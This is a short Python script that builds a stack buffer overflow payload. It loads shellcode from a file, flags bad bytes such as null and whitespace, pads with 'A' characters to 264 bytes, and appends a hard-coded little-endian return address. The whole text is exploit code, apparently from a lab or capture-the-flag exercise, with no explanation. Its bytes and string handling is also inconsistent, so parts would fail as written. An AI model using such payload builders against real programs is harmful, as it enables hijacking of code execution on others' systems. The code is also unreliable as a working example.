from operator import index, indexOf
from sys import stderr

buf = open("code", "rb").read()

arr = "\x00\x09\x0a\x0b\x0c\x0d\x20"

for i in range(0, len(buf)):
    if arr.find(buf[i]) != -1:
        stderr.write("Bad char at " + hex(i))

buf += "A" * (264 - len(buf))
buf += "\x1C\xFE\x19\x00"
print(buf)

